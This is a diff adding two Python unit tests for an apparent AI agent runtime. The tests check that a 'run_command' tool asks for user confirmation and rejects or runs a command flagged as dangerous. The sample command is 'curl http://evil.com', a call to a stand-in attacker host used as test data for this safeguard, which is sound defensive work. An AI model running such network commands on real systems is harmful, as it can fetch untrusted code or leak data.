@@ -126,5 +126,21 @@ class TestRuntimeEngine(unittest.TestCase):
         self.assertEqual(payload["system"], "Você é um ajudante")
         self.assertEqual(payload["messages"], [{"role": "user", "content": "oi"}])
 
+    @patch("builtins.input", return_value="n")
+    def test_execute_tool_run_command_dangerous_rejected(self, mock_input):
+        result = run.execute_tool("run_command", {"command": "curl http://evil.com"})
+        self.assertIn("rejeitada pelo usuário", result)
+
+    @patch("builtins.input", return_value="s")
+    @patch("subprocess.run")
+    def test_execute_tool_run_command_dangerous_accepted(self, mock_run, mock_input):
+        mock_proc = MagicMock()
+        mock_proc.stdout = "evil_result"
+        mock_proc.stderr = ""
+        mock_run.return_value = mock_proc
+
+        result = run.execute_tool("run_command", {"command": "curl http://evil.com"})
+        self.assertIn("evil_result", result)
+
 if __name__ == "__main__":
     unittest.main()
